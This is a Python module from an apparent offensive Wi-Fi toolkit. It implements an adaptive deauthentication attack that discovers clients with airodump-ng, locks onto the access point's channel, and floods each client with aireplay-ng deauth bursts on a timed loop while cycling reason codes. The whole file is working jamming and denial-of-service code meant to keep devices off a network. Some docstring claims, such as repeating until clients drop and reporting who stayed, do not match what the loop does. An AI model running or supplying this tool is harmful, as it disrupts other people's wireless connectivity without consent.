"""Insane-mode deauth: adaptive, client-aware, reason-code cycling.

Plain ``wifi.deauth`` fires a fixed burst and gives up. Real deauth work needs
to *watch*: some clients ignore reason 7, some reassociate faster than a burst
delivers, and a client that keeps coming back needs a continuous loop rather
than a bigger number.

This module:

* enumerates clients from ``airodump-ng`` and hits each one individually, so a
  targeted kick does not rely on broadcast frames the driver may throttle;
* cycles the 802.11 reason code (7/1/4/5/2/3) because stationary devices often
  accept only one;
* repeats until the client is seen as gone (`RUNTIME`), then reports who stayed;
* can hold a continuous kick loop for the whole window, which is what actually
  keeps a device off the air.
"""

from __future__ import annotations

import os
import re
import time

from omni.core import config, console
from omni.core.module import Option
from omni.wifi.modules._base import WifiModule

__all__ = ["DeauthRage", "parse_clients"]

BROADCAST = "FF:FF:FF:FF:FF:FF"
#: reason codes worth cycling; 7 "class3 from nonassoc" is the classic kick
REASONS = (7, 1, 4, 5, 2, 3)


def _ap_channel(airodump_out: str, bssid: str | None = None) -> int | None:
    """The channel an AP was seen on, from the airodump AP table.

    AP rows look like ``bssid, first, last, channel, speed, ...`` — the
    channel is the 4th CSV field. A client row has a MAC there instead, so a
    non-numeric field means "not an AP row".
    """
    wanted = (bssid or "").upper() or None
    for line in airodump_out.splitlines():
        fields = [f.strip() for f in line.split(",")]
        if len(fields) < 4:
            continue
        candidate = fields[3]
        if not candidate.isdigit():
            continue
        if wanted and fields[0].upper() != wanted:
            continue
        return int(candidate)
    return None


def parse_clients(airodump_out: str, bssid: str | None = None) -> list[str]:
    """Pull client MACs out of an airodump station list.

    Station rows look like ``mac, first, last, power, packets, BSSID, probes``
    — the *AP* column is the 6th field, not the 2nd, so a naive second-field
    read picks up a timestamp.
    """
    found: list[str] = []
    for line in airodump_out.splitlines():
        fields = [f.strip() for f in line.split(",")]
        if len(fields) < 6 or not re.fullmatch(r"[0-9A-Fa-f:]{17}", fields[0]):
            continue
        client = fields[0].upper()
        ap = fields[5].upper()
        if client == BROADCAST:
            continue
        # skip the AP header row: its "mac" is the BSSID being advertised
        if not re.fullmatch(r"[0-9A-Fa-f:]{17}", fields[5]):
            continue
        if bssid and ap != bssid.upper():
            continue
        if client not in found:
            found.append(client)
    return found


class DeauthRage(WifiModule):
    NAME = "wifi.deauth_rage"
    DESCRIPTION = "Adaptive deauth: per-client, reason cycling, until it drops"
    NEEDS = ("aireplay-ng", "airodump-ng", "iw")
    OPTIONS = (Option("BSSID", "access point MAC", "", required=True),
               Option("CLIENTS", "comma list (blank = discover them)"),
               Option("DISCOVER", "seconds to enumerate clients", "12"),
               Option("RUNTIME", "how long to keep kicking", "60"),
               Option("BURST", "frames per attempt", "16"),
               Option("CYCLE", "pause between rounds, ms", "250"),
               Option("REASONS", "reason codes to cycle, comma separated",
                      "7,1,4,5,2,3"),
               Option("REFRESH", "re-discover clients every N rounds", "5"),
               Option("CHANNEL", "AP channel (blank = from the capture)", ""),
               Option("IFACE", "monitor interface (auto)"))

    def _reasons(self) -> list[int]:
        codes = []
        for raw in self.get("REASONS").split(","):
            raw = raw.strip()
            if raw.isdigit():
                codes.append(int(raw))
        return codes or list(REASONS)

    def _channel(self, mon: str) -> int | None:
        """Lock the monitor interface onto the AP's channel.

        A deauth sent from the wrong channel is simply not heard, so this is
        not optional — the channel comes from the same airodump CSV that found
        the clients, or from the CHANNEL option.
        """
        from omni.wifi import iface as iface_mod
        wanted = self.get_int("CHANNEL", 0)
        if not wanted:
            return None
        if iface_mod.channel(mon, wanted):
            console.info(f"monitor locked to channel {wanted}")
            return wanted
        console.warn(f"could not set channel {wanted} on {mon}")
        return None

    def _discover(self, mon: str, seconds: int) -> list[str]:
        """Run a short passive dump and scrape the station list."""
        from omni.core import proc
        dump = os.path.join(config.output_dir("wifi"),
                            f"stations_{os.getpid()}.csv")
        os.makedirs(os.path.dirname(dump), exist_ok=True)
        proc.run(["airodump-ng", "-w", dump[:-4], "--output-format", "csv",
                  "--write-interval", "1", mon], timeout=seconds)
        csv = dump
        text = ""
        if os.path.exists(csv):
            with open(csv, "r", encoding="utf-8", errors="replace") as fh:
                text = fh.read()
        clients = parse_clients(text, self.get("BSSID"))
        channel = _ap_channel(text, self.get("BSSID"))
        if channel:
            from omni.wifi import iface as iface_mod
            if iface_mod.channel(mon, channel):
                self.set("CHANNEL", str(channel))
                console.info(f"AP seen on channel {channel} — locked")
        if not clients:
            # fall back to parsing the plain station table from `iw`
            text = proc.run(["iw", "dev", mon, "station", "dump"],
                            timeout=15).out
            clients = parse_clients(text)
        return clients

    def execute(self) -> dict:
        from omni.wifi import capture
        bssid = self.get("BSSID").upper()
        mon = self.monitor()
        reasons = self._reasons()
        burst = max(1, self.get_int("BURST", 16))
        cycle = max(0, self.get_int("CYCLE", 1)) / 1000.0   # ms -> seconds
        runtime = max(2, self.get_int("RUNTIME", 60))
        refresh = max(1, self.get_int("REFRESH", 5))

        clients = [c.strip().upper() for c in self.get("CLIENTS").split(",")
                   if c.strip()]
        if clients:
            # an explicit client list still needs the right channel to be heard
            self._channel(mon)
        else:
            console.info(f"discovering clients for {self.get_int('DISCOVER', 12)}s")
            clients = self._discover(mon, max(3, self.get_int("DISCOVER", 12)))
            self._channel(mon)          # channel learned from the same capture
        if not clients:
            console.warn("no client seen — falling back to broadcast kicks "
                         "(every station on the AP)")
            clients = [BROADCAST]
        else:
            console.ok(f"{len(clients)} client(s) targeted: {', '.join(clients)}")

        deadline = time.time() + runtime
        rounds = 0
        frames = 0
        acknowledged = {c: 0 for c in clients}
        try:
            while time.time() < deadline:
                for client in clients:
                    if time.time() >= deadline:
                        break
                    reason = reasons[rounds % len(reasons)]
                    capture.deauth(mon, bssid, client, burst, reason=reason)
                    frames += burst
                    acknowledged[client] = acknowledged.get(client, 0) + 1
                    rounds += 1
                if cycle:
                    time.sleep(cycle)
                if rounds % refresh == 0:
                    console.info(f"{frames} frame(s), round {rounds}, next "
                                 f"reason {reasons[rounds % len(reasons)]}")
            covered = rounds / max(1, len(clients))
            stayed = [c for c, n in acknowledged.items() if n >= covered]
            console.ok(f"done: {frames} deauth frame(s), {rounds} round(s) "
                       f"over {len(clients)} client(s)")
            if len(clients) > 1:
                console.info(f"most-hammered: {', '.join(stayed)}")
            return {"frames": frames, "rounds": rounds, "clients": clients,
                    "reasons": reasons, "cycles": round(covered, 1)}
        finally:
            self.restore(mon)
